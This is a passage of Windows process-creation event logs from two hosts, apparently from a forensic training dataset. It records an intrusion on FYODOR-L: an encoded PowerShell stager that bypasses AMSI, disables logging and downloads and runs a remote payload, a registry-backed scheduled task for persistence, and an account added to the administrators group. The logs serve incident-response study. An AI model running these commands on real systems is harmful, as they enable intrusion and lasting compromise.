	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2a14
	New Process Name:	C:\Windows\System32\NETSTAT.EXE
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\NETSTAT.EXE"" -an

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:40:57.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x25f0
	New Process Name:	C:\Windows\System32\NETSTAT.EXE
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\NETSTAT.EXE"" -an

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:33:16.000+0100","BGIST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\BruceGist
	Account Name:		BruceGist
	Account Domain:		AzureAD
	Logon ID:		0xB6DA4

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1cdc
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2348
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:33:16.000+0100","BGIST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\BruceGist
	Account Name:		BruceGist
	Account Domain:		AzureAD
	Logon ID:		0xB6DA4

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2348
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f30
	Creator Process Name:	C:\Users\BruceGist\AppData\Roaming\Dropbox\Client_53.4.67\Dropbox.exe
	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:33:12.000+0100","BGIST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\BruceGist
	Account Name:		BruceGist
	Account Domain:		AzureAD
	Logon ID:		0xB6DA4

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1850
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xa10
	Creator Process Name:	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:33:12.000+0100","BGIST-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\BruceGist
	Account Name:		BruceGist
	Account Domain:		AzureAD
	Logon ID:		0xB6DA4

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa10
	New Process Name:	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f30
	Creator Process Name:	C:\Users\BruceGist\AppData\Roaming\Dropbox\Client_53.4.67\Dropbox.exe
	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:16:53.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1b0c
	New Process Name:	C:\Windows\System32\schtasks.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\schtasks.exe"" /Delete /TN Updater /F

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:16:39.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1dfc
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\whoami.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:15:27.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xeb0
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x28c0
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:15:27.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x28c0
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1220
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAG8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAHIAcwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAEEATAB1AEUAKAAkAE4AdQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAGUAQwBUAEkAbwBuAHMALgBHAGUAbgBFAHIAaQBjAC4ARABJAEMAVABpAG8ATgBhAFIAeQBbAHMAdAByAEkATgBHACwAUwB5AFMAdABlAG0ALgBPAEIASgBlAGMAVABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABvAGMAawBdAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAHUATABsACwAKABOAGUAdwAtAE8AQgBqAEUAYwBUACAAQwBvAGwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBJAG4AZwBdACkAKQB9ACQAUgBFAEYAPQBbAFIARQBmAF0ALgBBAFMAcwBFAG0AYgBsAHkALgBHAEUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQB0AEYAaQBFAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAVQBlACgAJABuAFUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAcwBUAGUATQAuAE4AZQB0AC4AUwBFAFIAdgBJAEMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAGUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAE8AbgBUAGkATgB1AGUAPQAwADsAJAB3AGMAPQBOAEUAVwAtAE8AQgBKAEUAYwB0ACAAUwB5AFMAVABlAG0ALgBOAGUAdAAuAFcAZQBCAEMAbABpAGUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAYwAuAEgARQBBAGQAZQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAEgAZQBBAGQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBvAHgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcAZQBCAFIARQBRAFUARQBTAFQAXQA6ADoARABlAEYAQQBVAEwAVABXAGUAYgBQAHIAbwB4AFkAOwAkAHcAYwAuAFAAUgBPAFgAWQAuAEMAUgBlAGQAZQBOAFQASQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBEAEUAbgBUAEkAQQBsAEMAYQBDAGgARQBdADoAOgBEAGUAZgBBAFUATAB0AE4AZQB0AHcAbwByAEsAQwByAEUARABFAE4AVABJAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQBUAGUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBuAGMAbwBEAGkAbgBnAF0AOgA6AFUATgBpAGMAbwBkAEUALgBHAEUAdABTAHQAUgBpAE4ARwAoAFsAQwBPAE4AVgBFAFIAVABdADoAOgBGAFIATwBNAEIAYQBTAGUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAYwAuAEgAZQBBAGQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUAB0AGgAQQBWAGcAcwA9AEcAMwBkAHEAbgBoAHIAOQBNAC8AdgBzAFIAWgBvAHMASwBRAFEASAAxAEgAcABEAHoARwBnAD0AIgApADsAJABEAEEAdABBAD0AJAB3AEMALgBEAG8AdwBuAGwATwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAFQAKQA7ACQAaQBWAD0AJABkAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAGEAdABhAD0AJABkAEEAVABhAFsANAAuAC4AJABEAGEAdABBAC4AbABFAE4ARwBUAEgAXQA7AC0ASgBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:11:40.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2938
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1548
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\whoami.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:11:00.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x143c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1548
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:11:00.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		FYODOR-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1548
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x460
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:09:44.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x20d8
	New Process Name:	C:\Windows\System32\schtasks.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\schtasks.exe"" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:08:35.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d6c
	New Process Name:	C:\Windows\System32\net.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18d8
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	""C:\Windows\system32\net.exe"" localgroup administrators svcvnc /add

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
"2018-08-20T11:08:17.000+0100","FYODOR-L",4688,"A new process has been created.

Creator Subject:
	Security ID:		AzureAD\FyodorMalteskesko
	Account Name:		FyodorMalteskesko
	Account Domain:		AzureAD
	Logon ID:		0x1091C98

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
